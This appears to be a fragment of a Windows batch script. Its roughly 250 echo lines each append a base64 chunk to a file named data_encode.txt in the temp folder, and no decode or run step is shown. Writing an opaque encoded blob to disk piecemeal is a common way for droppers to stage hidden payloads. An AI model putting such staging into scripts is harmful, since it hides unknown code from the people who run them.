echo IiyCJEYk1ZJAiD+CcPtE8+KsxVCTxCRdgQH9W+PPdkSocqE1ppNFIzZ9YZrU+W+4 >>%temp%\data_encode.txt 
echo favD0VRr590tCxO0zkwYhKAsyK4V//u2OCvCgAm1Me96G/8V2ieG2NAar3HxQgd0 >>%temp%\data_encode.txt 
echo un5wSYzlHiwxxuAtNkeTs7nWlkeUdI9UTrMtvkG+91wtVzxF+HAHb78Rt6JOudGu >>%temp%\data_encode.txt 
echo RsaD+M/xD04VK5Z7w8/NugoUap5kBuOH4I7AcIx9Sri+4IVRLTTbWuy8rwOl4ayH >>%temp%\data_encode.txt 
echo eL2DhF8tvLjrCG/Y4rXYpGl84iQEfy29IEEf8WtaHaFk3sK7SfD1Bj8PFdFMxG7f >>%temp%\data_encode.txt 
echo ipgsVkXnudlCQ8kV8k9XxOsgo/tM/wVjJ7E0JJYe4You1tBoA4Rmh8oVxuYr4vhA >>%temp%\data_encode.txt 
echo 4kAeEsKUt0o9yndqCOwyzhz/P+QoRJPyPACAQ0usXQt4VEWWvt3phBASbiCJRgnS >>%temp%\data_encode.txt 
echo SAMJJNCBRklMD3RIeEhQFmKQlwMEMrDyCKSbRBQIdjekt23D+oE7u8rMIDM7DKNj >>%temp%\data_encode.txt 
echo XDGERNskIIqKAqO7YGbkNWougRHkkYSW9Jxzqm7f2xHwjt9+Xzq3bj1OPW7VqapT >>%temp%\data_encode.txt 
echo df5zm/k6xhg+Y1PArVYTyDvUHGMk54HITBiDDpt+/8n0uAQVYsJlwN0EwD+2vrmt >>%temp%\data_encode.txt 
echo fNF4K/HtHc+ShH/q/Mn4Q+ntnY+qEAt9sTB4lCNjcFlGOPa8QEJ+EvXLXtzfbHEQ >>%temp%\data_encode.txt 
echo WD38RsgOChmHi1H2g79s+oNpDfHTD/NL5el4mWkX6qR5l5MyICmAekd75plSvfPV >>%temp%\data_encode.txt 
echo uqYpGDDV3SJfYZOvr8lXhDaghU/vXZXZGaILlVumOgNBu8EdtN/jmY96yKmeUZ5n >>%temp%\data_encode.txt 
echo TOO53rD0++tdQa/1cVJUEd0f4LXcFFLIrIh2t2xIdDc64t9FxQ3S5/GQppSzI6Y8 >>%temp%\data_encode.txt 
echo P2hy51ltQin8tvPnn1S/Z7v9TsIPNa13JboIKTt5FyrTQIkyG1Gt2TNa1mNGm7SZ >>%temp%\data_encode.txt 
echo jZ4kjOchZfVdeIG17TMoTQyCsGU2Ql0MQMJEtMi7gPC7Dtv3oEZ0228xsG27rIf7 >>%temp%\data_encode.txt 
echo u/6kloJWaj6cMjAOq0qqnltFf67O2azH6x/zETbN2Zrh7JgmbqnVCwJUz/Qzm7B1 >>%temp%\data_encode.txt 
echo 3jibcHy88quC99pufj/l16SRRssd4nXcJmzBTyxfUrf3WfBbdpu4T8PPx92N3cL+ >>%temp%\data_encode.txt 
echo Aj8bbLtFvz4Xr3D8tisYnIpoBHjLXOmc61FNCE/m3Ycd/ZiCXPh8sws7W9t+NLcW >>%temp%\data_encode.txt 
echo 9MThS+bhtj0Q+yJpRLedwvscqPiLgJNt54jELnK75RD82G2HWQh9+KV4P5AH4h3l >>%temp%\data_encode.txt 
echo tldZILqlqSywr0qjm0Zd2xb5QqE8MDGErijSgICBE4+38BqlKURBdKPRQLKAJj3I >>%temp%\data_encode.txt 
echo fVDbmGliD+Y+ppCWXALLNymkQc6HthQbVMDg5KEvW6prcyKRU6hQiheipE8Q4JIu >>%temp%\data_encode.txt 
echo hLu6iFxvZC80eKQ1stpp27d04iPwg09hWZkAc5cQwmNLzmzx0tBDRZ/vI+QK9hSr >>%temp%\data_encode.txt 
echo USV/J10lb7Tfxa+ZI5BpH0W+4jyY7Dkx94Byz/wo3ut6cTVhmp5F75ohtvA75bP7 >>%temp%\data_encode.txt 
echo hd8pD7tvcesL5v9JCM8DFU2ipH4aNIlIV02V6PS9GhNthURMjdQbh8o2ioIkM+NV >>%temp%\data_encode.txt 
echo wBB5W6u1EORaYCXYun5Cz41EFZv6azBivHEFDCM1sQT1cQsQvLk+AAGoFo139guY >>%temp%\data_encode.txt 
echo ElXp/Uot7tVai+mDsBbTGZRrLKp3yCT+7x5N5Q5972GEWj1YKcOL3QhI+TJ+PmUM >>%temp%\data_encode.txt 
echo MeXC8wRLtORIvUWVi1lbMZMK+U0oHccVTl5FvY8pK1PPGaIQbUnWQBTvad3PVdtK >>%temp%\data_encode.txt 
echo IbEUEeT1g1ZBdan9ETabUEIKzPujwImfkFU5XtwXN5EXaOugUL42pt/3oY06TpGW >>%temp%\data_encode.txt 
echo QvCO4k3CPkL9g/c/6jq37ihmk1LTy3drbPOjkEg6zvEgSTMYW/EsJHd2DNl/1GgT >>%temp%\data_encode.txt 
echo NkTuv260hbpujVGufP0bRipDIg58VOJmevHsziYfM7GcJqpTzddSJunpQDAI/C2D >>%temp%\data_encode.txt 
echo 1ksMPyFnJ+IPQ3QLT2ZmV6PBlc59UtXAHKLbHQXMy07MS3Rnw0vl4I/hrT2zJfO4 >>%temp%\data_encode.txt 
echo 04p6Aob9e3HB0R9VSt5lFyBJu2Nbc9NZPVrkYPftwhSZL8xVXY7OvQN+9oS7mTbz >>%temp%\data_encode.txt 
echo B4ifHXWE3c0T3SJxgKQw/Gxo7CXLFSjs9xAK+xtBBYU9TA2F/a4aCjseFRbGqfBf >>%temp%\data_encode.txt 
echo d8qLtYmwmrk6kXRTzJNsgpH/Dql+5m6/I/BrHb6bKwrL9mUiR3EusFgFZT3c2x/V >>%temp%\data_encode.txt 
echo PphpEISogWbnxl/skc7lplQ0BpI+ie4YKnjXNDese5Kq6udV3fCW82AOvwHJ21tQ >>%temp%\data_encode.txt 
echo FJamschuuV2er0CDv0dak6BwbftRmdVnN40lcGfVGG9P1NDL8HLlz2C6llYhSqtS >>%temp%\data_encode.txt 
echo TavaMkV2UF1+KlL9vzJV9gFBZrqUitU3yNWolciXMAMfRba/Kld2l9SbbDLfEXR7 >>%temp%\data_encode.txt 
echo 9x7S0ioPA93uGQa6HbjJ+dGPIG/PZ6RUyNtNzH6AOfM66rK/eZMUPMzvG35Jy4hd >>%temp%\data_encode.txt 
echo N0lnwUL6wrCe8CGw8vuG/6J1RKWvPFiSNYbZryglgKqxfNmwW0d4Rxb3cftwGqmZ >>%temp%\data_encode.txt 
echo waz3yxJhmW/xWhqw/NkQY1LW+2suwHregvqlryToyCIlKqzROA0lMfMkDYKSxIxJ >>%temp%\data_encode.txt 
echo ViXobmsm488JBAM+1Ws3pbuvOyKdN3UbHuQrmY09POel7Sp1RzV00R/ybd1WG8ff >>%temp%\data_encode.txt 
echo IczwZhkz/B316uWlvlp0sQmwmD6KN7aeGHNiOJhUoRYy1CxSJ9nOfFmhdSkhnFa0 >>%temp%\data_encode.txt 
echo Jlr4VaR1XQTmm9rwR6g1GTe3MxyAbbuIQzWJVV4Gbp9cR5Y9PmmXcK/W1DUAN1h0 >>%temp%\data_encode.txt 
echo r/yGPu07vO/sy3lBF4QOm5LWWYczApqBxTWMEVHEjDYZSyudqj/UFlbkx/pomQf2 >>%temp%\data_encode.txt 
echo wCdreBVK2n5SWoYbgmd+CMTeq89PAGL/33jNQOxPwFzUdFqPKlICy8qMo//1ThiO >>%temp%\data_encode.txt 
echo wYesbDju7JSHEdo2FyYx/zUXpKrOUOpmlqcFUy9mqTOIozuLOmlIwjir56lLWWpr >>%temp%\data_encode.txt 
echo J4ETPQWLdrwlJyxZVLx4WbGwaBne3hCWVCwRlq980gir+WKjgNdcheULFxmFsqfK >>%temp%\data_encode.txt 
echo jMLSZYuNwprFq4wCw6kVRgiOlcLjttyJkycIE225obMJ8LIVFOAjz1aIj6n5swV+ >>%temp%\data_encode.txt 
echo RQVfZ+SR7/QZjwok41q5SsAzBkFlD33ThQIc/i+bFrD5cDxDOcIp1huR1WxHRBl3 >>%temp%\data_encode.txt 
echo DKpH77PixOcdk0qwCP1JCTD2bu82Sqk7qbvsbLrPExOyEZFiai1YQlACeYhjF4Kg >>%temp%\data_encode.txt 
echo 2jOA8MfzPMvRgmtkP9JAx6k7p69YOzUBeliOWFuGW7qxaC24vIdYi6uTsdymk1hr >>%temp%\data_encode.txt 
echo vZeWVIEYcV/b2kga7mrWoOc98o2CbqyhNW4nt0uShot3rKHSq9me4OneGno2DBUo >>%temp%\data_encode.txt 
echo 6pb99xFyX47XsKMR1YAhWcORjz/+mBbCacp8NlQLTeIMkMhzqf0cT9h0PsIX+wLO >>%temp%\data_encode.txt 
echo MLrDaZ8gFETrX+K0FW8sFO9yf24x1+CTi+eXi2cephSvSgtNGoKQyNPR/rWqeCms >>%temp%\data_encode.txt 
echo eC1pp9CASqtVU/FuxohbhmPhDK8ZV+eG0HlqVGW6GquJUJToWgvbb5+jw9mlEzff >>%temp%\data_encode.txt 
echo kxKyYSe69PBCjC1Ef7hCf5sW+oxUtOh6rR+Q2lugkIpPV0hN0UJKXlf4njORkhLb >>%temp%\data_encode.txt 
echo W6FybqtnOF99Ak2fiwXnKVuv8720WBeSDaC4T9/DTUkDNW9/k6qHI/jJDi3EqH9k >>%temp%\data_encode.txt 
echo 4ABJ9YVjvDyhNXkpJk9KVyXH3cMALcnFfRny6romwxaGq3UqRlN6q2yoJn6ELQxx >>%temp%\data_encode.txt 
echo 59fa0o+x8PTTVekR2uLn2tL3f0Auv5J+AjX/fdoIRKKedH0d9LfdOkf/3fr6d8Dp >>%temp%\data_encode.txt 
echo SKw/CI/u+seFrENeUrJqreupBaYFVa89zU3nYcP7HfIzvej6+V0EJpoDg2duksC5 >>%temp%\data_encode.txt 
echo nOtkAplZz0GQk9cSmDeMu1e4s5fo+g/u7C26nuPOONG1iTsNMEa5UxRdTyagKcHB >>%temp%\data_encode.txt 
echo CI1nFRbgLmxyguzc8l1fgQNxuL4IObfsI2c8+v66L1kvwzEyrv0QPmrWOPQ1GVUu >>%temp%\data_encode.txt 
echo EyrstB9C2V/Iy0BeBrVXDxxdl12Ha8ormIee4qAUvqacx4kkL73aK5q8xtOuMaov >>%temp%\data_encode.txt 
echo uoVoCC6D4AoIjqDgaAo+3oeCDargKApmys2/YsFAvcbOg3uijuKrVCmoWwztZJcr >>%temp%\data_encode.txt 
echo ltFqRtqU83T5G3/WQwO6mVg7Br8yrsWT+qDFTPiwX8UjiGPdR9CVXC0VkTKDTGW1 >>%temp%\data_encode.txt 
echo q/sUe1rI18QatO6zMF8ja6+6k2G+KawB6r4M801m7V93Lsw3kTVvXWuYbzxro7qL >>%temp%\data_encode.txt 
echo Yb6hdjhqVrr451Faqh/aFIouNIoHPXC8DjZ23gxklmjfE7WrxepeiGfB5NMMopFk >>%temp%\data_encode.txt 
echo P6OU3H4RpWFAlQB5S4S4xagXBE37FLb/oy+06WuhURCa/h7L2tCehYMlQnQ9ogsN >>%temp%\data_encode.txt 
echo twm60HAby8y35LgvOuKdX8PwelcxY1/itCL3Ehx5mOfoh5RKvBKpzUrd+E0HcTkY >>%temp%\data_encode.txt 
echo AqgtVdF4QgsNYMAyA0VpOu5OJs4NrQJ7wnM8bKc3/pK+KRCX5rB9d3I85gSdI5qf >>%temp%\data_encode.txt 
echo jM0ZTe+xiECALfldgY1NLtlKiT42aNmIfB1SC+Td8Wg2dTHMETup54rzHFp/S7xV >>%temp%\data_encode.txt 
echo tigq7J7tY1qy5etiL51WFUMRdCc8emkOOBDkqnkB2sdCBArne6RF/sYCto0Q93XA >>%temp%\data_encode.txt 
echo bGV2njeI+5pLsmBbgtsOccvJWNSqNUwSBH8HFNFeyF7E6qpeGPBBDwioxoCH2ItY >>%temp%\data_encode.txt 
echo 3R6DoBU9/Sb0HQwusXofeen8UejV138vPJyBHvZo/woLyZpwkYniBdkK69FRJB+M >>%temp%\data_encode.txt 
echo lys+L0JDxTcFJk7FsdTZU5Dd1dmR6I4civ4BQ8hd/We9XHjRNU1xV+/RUdlF1wM6 >>%temp%\data_encode.txt 
echo gcaWWbDPoGeyuOUcz/lfVJ+kWa/lk9hN5syWkqwra4pYf7jVSO3svm3wMlZhxoZJ >>%temp%\data_encode.txt 
echo OyTu+1L3ObSPBTYgMN7RFBrhAXN7VbHDfU8DlzmFlGZlh2+b79NSRixdnVTMhVEP >>%temp%\data_encode.txt 
echo AAl/oorzf6HT0uPvhuTUWhHi5mRyQz/YakG5s79mjI1g1hY8wWDeUIYgU39GC3V5 >>%temp%\data_encode.txt 
echo qxhBZwd41gdfcwgKbWd28WwN4uadvKN3zg8GrXOmTykU3c8TmofD4NsQlwWRxGfX >>%temp%\data_encode.txt 
echo k8e8EZG+aZGH8kZECrIg/OgDypdtFTSUqQqJAAXcqveAvYV0v1yUoeLmu3hRVmJR >>%temp%\data_encode.txt 
echo Hi7IzxfdEcgS5hP0xwncNeQP0Nkn1OWOVdb494xVirBE0GJw83VEDbVAsraGTYFC >>%temp%\data_encode.txt 
echo G3bplwhDhtzVJnJPG40NNewmL12cuLniJpUOStN6ZB6ZrvIcat01j2ApPKec3wCH >>%temp%\data_encode.txt 
echo P4VMK1AQPiHGP6gU8GBQ0HAsEmS4D97nGGPq4z7uKM48TrW+fiBa3N78sPPsaWfz >>%temp%\data_encode.txt 
echo +OsH8LACIYUtqgaZrmqQQi35+fKjpOW86a/AFODdywQFUW3/5nWxLkTmLiWUCtN8 >>%temp%\data_encode.txt 
echo L6UQzszMPGwjxISU+3Dh94zMq3MVaMJ4VR852KWhPOGZ6mTyiaL7WgD74fy+mEXa >>%temp%\data_encode.txt 
echo XGz5o55jznMLms5EbzojQF2bzkc3BSJ7fuhuccQ4byyxW5w3FttT6XQkccfW0ly2 >>%temp%\data_encode.txt 
echo 3s8iZhnauo2EQknvoRAMJ8K2Yw0497R9KA+QygCr04k5oQGyIsDL1EvcvBDtMOcb >>%temp%\data_encode.txt 
echo JOwqmwJFM4lDEuckd/VX1J2mTEN/nyC7N/baFEDzzlLzDUxWjMHut29wsuNFdwzP >>%temp%\data_encode.txt 
echo dRHmunjOslLR3X6DxoKP2TiG/udzDGxtho3k9/t7IH5j45Xfift6l3hEsbZI79tL >>%temp%\data_encode.txt 
echo sapm6cXa9cYqV04lswwcGrbS+3LD9hA3v4yk15OI8thsQheajPg2nkPOr3s4uyLW >>%temp%\data_encode.txt 
echo RvpJUgTlOQ7B1qLpMx4VXbiUJ2f5GmvRxMkTGrqg59uTyV0+Ex623IbIacjLGnrC >>%temp%\data_encode.txt 
echo w/eMabLvsSg8nFgxmwDaYU/zgTflrUpm1zWRhDt8QjOPUTpN9fd4tP895msrKGjo >>%temp%\data_encode.txt 
echo A7Ta/mgtmpFXaC+nR3mstSjPVtiQjCH/bi2aNrPILlqLpubPbhgAXtLTMpcVG4bw >>%temp%\data_encode.txt 
echo goibVxMIiulRwfdYrK/A9DC4Jxvh35RUWfYtgw9+ehNW/HmmR9Ikq3w+2TAC6aKF >>%temp%\data_encode.txt 
echo uoYx6DLSeMhdgh95H31wcleXKNhU7i87eCkgTnonGeP9DTMoL9bmo6FwdwLE3q23 >>%temp%\data_encode.txt 
echo r/I9RyGeTz2feHVoaHUrGVo9OrD5DoZW0y67W+wx/zOyalssJrZhK74O39lnyZqA >>%temp%\data_encode.txt 
echo ZyT7A4J6qWOPdDYaPHrK2mB/8v8ty1pVlhMDChPTyVnq8LpKOrTFVGIlKik2dOzf >>%temp%\data_encode.txt 
echo MBPq7DQeO+njHHD2FSS7l8LpvBnJf3MDQZPyBekDmtoeDmArV7Qr3OhQO7KLxyLo >>%temp%\data_encode.txt 
echo 5LR2vd5DqCEOHaG11s5nAhjknNDppOdvKnOir50Nvq+K2EToacalp86+mjF34B0y >>%temp%\data_encode.txt 
echo dvZWFbP9plMLc28RXf1gbMufIhu5fX+enwPy4w2m00k92jm7bfPJBbt6nRigoUSs >>%temp%\data_encode.txt 
echo PeDLqfRZOnyJtcD0Gs9HVB1rPKMXjgmHUz8SawMo5oNI+WTm2JyF36TSl3LJF/tS >>%temp%\data_encode.txt 
echo k9TLeWYATuBSQOY3fcXN44EyDIzpmS2eLs91z/m0LyaItQ+jNU/nIT0SyZlmY6sj >>%temp%\data_encode.txt 
echo oROXfOKGFhgTpaGvFQ8LIMkOn9UZiPWnwXpVdM26Rm8b4/wWWr/GSA+Bj99GL3HS >>%temp%\data_encode.txt 
echo iGv41XCe9f83xR8a8tg4kK1U/O9QQG9MdhqcbDUqXb2KEREByj/GghEuhjw2xvvn >>%temp%\data_encode.txt 
echo WWx8Lpc+An9/LL3jXCU1XOXjl41JfyWRf51So8fGMsaV/RFE9kVGtoAVSMQlfZBS >>%temp%\data_encode.txt 
echo rEe6E4guLpul4qsyE/cfoQjzQh5QoGlUcuT6UjYmHEEJcXaQhlG8wqWQ8BeU5aCQ >>%temp%\data_encode.txt 
echo x8YJDNTNHu83UgLkKFLnFbL3kRPhx/2P6L5yRelKtIE5ixFwZEsnrshYcPZU9oSy >>%temp%\data_encode.txt 
echo zCRSKx1A6k8Q7h9M7zh0pF9dCXU+fxkQxyErul7g9HRS1RWa0+NxiS2z6UuZbOjK >>%temp%\data_encode.txt 
echo Q+Bv15UhMNBw+9W9BYagWfr8OwbSKa/oS802fk0pJP+9juY5vmXR5DFlhmhtf+XS >>%temp%\data_encode.txt 
echo GZiNF/w9GKzJkGbDg0t0lovudOY5mHmiFGim6O64SJ6XLxL3RUlOqTQPXqxk/ME9 >>%temp%\data_encode.txt 
echo RfFfLOUpL8XSgxQJuI/9QXqUJ1uFSkxylxIrQ+pDsRrRv+tCyL9M6lRelksXlJdF >>%temp%\data_encode.txt 
echo 0qkLIbxZw6WRNqGpNVotVN5+Dar/NlDlorj6l6G9WTlG00PcgnfnrMJ0CFsKYfYU >>%temp%\data_encode.txt 
echo cotbvkRDCA6KPR4tCtT/NZMYl8G3jYmuYRb+/bWQCGyEQ18zucplitWFhGboNQ28 >>%temp%\data_encode.txt 
echo 4hQxG3rNAq/eisAOvWaAl6gLycvQKx+84kPCOPJ6HLz6YM5XXC01IyoYpb4smU5F >>%temp%\data_encode.txt 
echo CSdBLl+HZkqUDRXISxcz1EPacQEbGj5A/bOZNGpg+q2vptpuhRaLC2LwUQiupWCD >>%temp%\data_encode.txt 
echo /F4u1v+BYtVALIQ/tAqnIdYBivUlvNcfpWBoappUsNljsX0NMkifFdtGdDULioDT >>%temp%\data_encode.txt 
echo c7lmqetwhVq8SZUuc6hFlyTxLOVeEYo0c2GYEDRaLQSNVJpZFnBGKR9jiUpUyiRy >>%temp%\data_encode.txt 
echo NYtVYlBFUtmzu6SydCRKc9pUfT0rqOrF6QiL+jbVJPMwl1dlNla5YvFaps3Z2WvD >>%temp%\data_encode.txt 
echo ZfbJ7NGQBj1noKj2qXh4Gwhvs+A5CJ55rB0o1v3wns8agd5xjzWDtYAd0w3m6Yay >>%temp%\data_encode.txt 
echo dNFyvCEsnUF+T2Xp9HK6NJ5uOEunk+MNw3S8Rqm8y2dezA3VpyEi3P6yWMuq52q0 >>%temp%\data_encode.txt 
echo R1Tpc21Tn7p4SJ+e677o6MPlBQMmVd2bWxlId1zNd97Ub/BDGaCRqIlzg2k43YZ6 >>%temp%\data_encode.txt 
echo KDZvQMLdSQYdve41mXXKZfLb2LhfzsCg39wTDMJS0HX6q9AXkQ+j4Ita+JkUzxkT >>%temp%\data_encode.txt 
echo ycdT5+OZlOSjbsdTuEZRnYJNuKxhjcIz1sm8opDZQJaz2sizOgZ05elfncepSxry >>%temp%\data_encode.txt 
echo kLr+BqsbGy6eH0FXHro6zxGcfwqXS5YOtwnHzjvPRnhzthesZqdDcibrNGXy4jm2 >>%temp%\data_encode.txt 
echo fLw0zAbrbHZQqOckxO0HfOk7LGxwRLemaSFI3xdKlXmY0TKI25ucTaNoNbWILjgl >>%temp%\data_encode.txt 
echo EbTv26ZLnMQQPCsmG9HRrYe+hSw6pDfP4iIuqR/rG2ERLSziDox4Sbp8hiIiwrDv >>%temp%\data_encode.txt 
echo 5fCIKSyiHSOekNLOMCNMb30rECAdmlzKPc2rnmoT0prV+91x32rZhNPFAqnmVDD4 >>%temp%\data_encode.txt 
echo yOMTZ/6IAkrJQruwcMUyYe0KVMesEIrhudC+RlhaWiKsWFgsrFu3TiguXSHYR5mF >>%temp%\data_encode.txt 
echo lfYSYfViCC9eJawtsQsr1pYJi5YYhZVlTwr2pWWo0vGD3FCzEVFiECMmOxP/jcJ/ >>%temp%\data_encode.txt 
echo o/GfRVg2KHsQ4rysRD3HfzT3/XFVVdni58IBrvzwUIKDBXmtS0/m8euKlBoUCJga >>%temp%\data_encode.txt 
echo KQamFZO/oPQ7hKTnqs3wVZh7r3Le8fbMcRqb6pXpNDbZZOUglSVX8CI2lWKlyWRq >>%temp%\data_encode.txt 
echo Wfd405yaLooib621zzn3gFi89/l+P+/9Aff82Hudvfdae+211l57rZu4ilvGwr8F >>%temp%\data_encode.txt 
echo VYs4+0033cRRHAdL8rgqu4VLXsCxuA54lgiecMlZFcnJHIUC4dKXpKelp6cHg4Pg >>%temp%\data_encode.txt 
echo aUluvvgIdKeCmw9dTM7MsnPBeMe1Kro178iHHN2Rws6jy8LejqIAg+gr4V77dEl1 >>%temp%\data_encode.txt 
echo PgVYFhqrhwmNK6/VMnf/y1kUpMMFZ8cQmN2l5x3dJmHNU0PQgSMGieug4jgRKjTW >>%temp%\data_encode.txt 
echo v/9IPtdQaM2yNev7S95CPs+S5zg/dOUPpMOy/Qnpe48/1tFzrbDmmXA8Z/HK2sX5 >>%temp%\data_encode.txt 
echo 3Lo/iPlcOPwdgRvLsnwO742/xj/jO+1PeycvB7pvhi+XcPDlqJU/BNpMYhh8vuQe >>%temp%\data_encode.txt 
echo Z+djkXAxYxb8Ky0MtOTR83uKAi0Wuiq7J9ASK2KRmVhkFhQx04t7oQhPV7OhSAgV >>%temp%\data_encode.txt 
echo uQ+LPABFGPT7i9zl1jxbwNb8JjHtRsavy/gSZwcw62EFeVMeO+cNTZ1U4LgcsrLz >>%temp%\data_encode.txt 
echo LnehNc8baklpcVyMEh4vCmX0vbYaN8opZDa8R+p357xy7hFiYOhRolvOb/xmEJND >>%temp%\data_encode.txt 
echo d174IAQnXIB2gk3C75onO46fdTSXaZx3Y3WQK7b7BwH4IQftioMAWR5CHqy07XSS >>%temp%\data_encode.txt 
echo qwNFzdUhXu/oCWXpJcmnYhxdRAnODLUZzA+CmuFxNFcN1IyJg2mG6t7KC87H0b5/ >>%temp%\data_encode.txt 
echo Pgw+yjxqtT37UNWjdli+mu3HGU/5fTT/hn+wdS0Vr58jAcKLHktuDKGNbobFpELr >>%temp%\data_encode.txt 
echo S0pqJNcndeXThhavOz2IFvuO1pJ7qeY5i5HEUx2ttfr+mME1dk4eeYt+JmGR86ZV >>%temp%\data_encode.txt 
echo R/wd2lJdbp2rr9PZFhbuP7hOi8F1OmozW6fxpAlQVIWShOYyeDHmNHbW1sGYMHMq >>%temp%\data_encode.txt 
echo pMvvVB/dzdWay4bRc/9lZTDL2a8xcDajvU0IQQx1+KJxHOVcJO23yZcwx+pL+zX7 >>%temp%\data_encode.txt 
echo 1kvIeWrCpHNdfukHT89IdCo8jUuBf02QXDYguRx3NK9Q/taDJ236U7OopKk++q9W >>%temp%\data_encode.txt 
echo o2MR+U51fYFuRWOZW1EgpQunEfC4YhyCz30gPq9BS/CRoPgsriLRWXwU6eAOUAEW >>%temp%\data_encode.txt 
echo ksRcaM0HdqHKyoXWicAxVCm50FoATEOVjwutyDJUybjQilxDlYkLrZOAcajScKH1 >>%temp%\data_encode.txt 
echo TmAbqhxcaJ1MwcvxgxV+N/6k+VeDSJcinZOOOo7H1p9sBrR6joeom/6uNphGMXVw >>%temp%\data_encode.txt 
echo jTmE7mMyG/9X6vSb1OkT0vf1X2DIYubyZWrH7qd8SJ2vBbYCQ3/ya5gwX5m2p0Eb >>%temp%\data_encode.txt 
echo lrMehWxfaGz30mC7LcbuxQrOj4m1Q3PhX8EKZJLIEPPuVcZfZBhIZ7oxOh77zFO1 >>%temp%\data_encode.txt 
echo qXc9e2vGSVmAxdqqSUTwxX9FKc0iCZzyz+5gMSyFzgVY6ttTlBfraJ93KoRD7N27 >>%temp%\data_encode.txt 
echo xncfqu92sncvGN8dUt89fYoln6iDb/rr1tHgK/+qp6lAygi6lhSZdNeS85zuWvKF >>%temp%\data_encode.txt 
echo frmmhdNdS/6iDtEdsPro9JCPQ7kkOJS8fnMnUNryFTpxxepUU4R40W4m45JVHGgz >>%temp%\data_encode.txt 
echo q74gRHtmMSPQxutPJuGCdG2gLUR1CCm0TlG+BiLHJ2X2c9vT/N9g8VL7Ibj8EGGV >>%temp%\data_encode.txt 
echo 2hvh8nVsbY1yd69uZsjViFIZp14toFwUTLG3MQNDvGpgiFWLpClRvbp14eJl9nCp >>%temp%\data_encode.txt 
echo ElCvqpRv1Kv5ykm4iqFIvmN72CSkoV6Hw5dp0i7XeGhQsUXObdrl8lUs0u6j6hDz >>%temp%\data_encode.txt 
echo qmUAhxh6xGwCKlEzawANFa9q7zj4bSGqBYDGOE/V/WH8dLUfZykgL11woXV3+z3K >>%temp%\data_encode.txt 
echo jEus6QV+N5kvRK3zy9TOlyqqtT6vmBIe4FWh8gtNrRdLmXZ/MxvBeNLvBZc2ulPo >>%temp%\data_encode.txt 
echo yABe3UWZ10jpx1LnsNS16rssMhvg1Rg6h4RXJcTA8eoe5dvLaM2MFFbb0QbLXFzd >>%temp%\data_encode.txt 
echo otWGVH+4msnu6Dx2AuhWmUFliMG+Pm5riD3k9bENZVbbVn57lrChZfQRJTXQ5/wH >>%temp%\data_encode.txt 
echo CJOj5RjzHykTcaZjvEloHCY431PTzc1SDTbhX7LUmMkoGzSWmlgNLO2U+xXt/IIV >>%temp%\data_encode.txt 
echo 7abEJaUhhqKF/YpuV4t+yIqGGory/Yq61KJbWFHeULTV1Lfo/WrRx1jRMENRZ7+i >>%temp%\data_encode.txt 
echo GWrRaaxouLGt/YryatGbqOhdEZuwpNB40DEOCl/g+hY+fJIVQj4k9df3S3mhsSDM >>%temp%\data_encode.txt 
echo czLBczzWtAeuwz3HzXjhMe2h016NUTjEnhMJnpOxpoM4hp6TZroIpS204K6u6SDZ >>%temp%\data_encode.txt 
echo xX0nuJ/efHa0jn6gBRoMn7BiX+HXAm0MAwiJ2Ci4T4D7UDrpBt+UKOfMXSY619Y4 >>%temp%\data_encode.txt 
echo jLTi4JdJB6yB7/pXbypB4gERhy9JxgFQwlEdhd4ryEHYWzO8ncHeYozvKx4uH+jh >>%temp%\data_encode.txt 
echo rQM97OoZCGaPnk/ninc1A1XI7NHWg6nzqrlJlfO5u+ct4fJrlsDvY9xUezX8VXH5 >>%temp%\data_encode.txt 
echo 9oe50soabvoCkZu2eBlXWLlA1b9yQMgrQ3L4nGVTmV2HNLMX0Q/K8OwTwTO2jy9g >>%temp%\data_encode.txt 
echo yZDoLJm8IlquiZVnx6H/jjzZLC/k0U9EHjcJRjnVfW+vozvKHf3X1Np89HXkDCd1 >>%temp%\data_encode.txt 
echo XyT7TQ7LWnkXVE9ETyC51poKcmEC+Z5AK3Avs35PVQSRQSxJjar75/ScfAoi/87n >>%temp%\data_encode.txt 
echo lPtmtqM1hwTUdWr1se+MdPlnIK7xfA3WGAU1uk7JVQBVtMahX4zndBh6IeSsd/O7 >>%temp%\data_encode.txt 
echo 0eQE8ksK1MQzQCis+uYBbP8L1DaAQceAGPDZACUTodS3UduKSZqN1UTuW7FtvFWZ >>%temp%\data_encode.txt 
echo g3ucCBiEYTrylZjDlnQzAJY+JT6IjxfBY+j9bJxpv4BXSkYvy5P6LMsLUyJHSR9I >>%temp%\data_encode.txt 
echo 73vOjvCciXJ4SxynRkr70ZvPczoWXlRZUz1n4x0nR0roxvS+O2eI50yY4yvBceoO >>%temp%\data_encode.txt 
echo x9e3K8suM4tGAbBq5RY8lNXsf+Hq9oeZ0imgiHtmyPbolGZ0pHwawxN437ncK7XJ >>%temp%\data_encode.txt 
echo ReaUTvnu2K4DmOimjrzLUFwRh44Jn9TQ4vGZs/jnpthPS/s9Sqg4bV1WuMPLa8+v >>%temp%\data_encode.txt 
echo 9juoQlPsb0gHHSci+n3pu64D993P8K7H7yitFDGOTRmluJ4HVxhGvUKPDxpZgMF0 >>%temp%\data_encode.txt 
echo KrHI6BQWag2j3CxfSGHQHqNgq5Va7EGAEYk5GZPTxoxZaiG2F6km1KZQsxMsCxbb >>%temp%\data_encode.txt 
echo qyosWl7tftFtMN6i45tyOf4403+KAWklQCVlUhXD9rfHYILz6nl1wHQxEFoJEFoZ >>%temp%\data_encode.txt 
echo kqmjtbxFCqDK7q6yjkMVkPS9cmZCRAn5wNjgMXwJdbO4OtWTMPQqB0TgJ0+Tek/i >>%temp%\data_encode.txt 
echo 1KEDpJIXM5Dkx22dI7iO9VE+T+Kcvawm8IaZOhHWZls7yG/CBo+tY8qoD0F8ETbs >>%temp%\data_encode.txt 
echo sbWj4D511Mdo/wMhBt5OGVVMcyYV3vC+1Z9j5p5Y6GYs7jevoVteGYJJEP7t8yCX >>%temp%\data_encode.txt 
echo z1wV1FZPdg5CkfNv90011C8x1H/BUN90VUVwNTpk7YwZrp5lDJ5FNPtey0CNfbrg >>%temp%\data_encode.txt 
echo 6kbGncoywC9mg+PYE4IIPHsr5mTDV8LOZocv0tUu3vnWb1axY85ao85VBA9yxQyq >>%temp%\data_encode.txt 
echo URJuoDgBjH+nlqxUw1rqiKA/kMvQ2x1HBwP4jl7KKIGQHMdXob7ru/4Y4oKOPPGY >>%temp%\data_encode.txt 
echo peLiZwZ7t+EDpYP6AJ7W/FH75oD56GdOKcRJOK+6IgOm453sTstP3zcfxYD1jQGB >>%temp%\data_encode.txt 
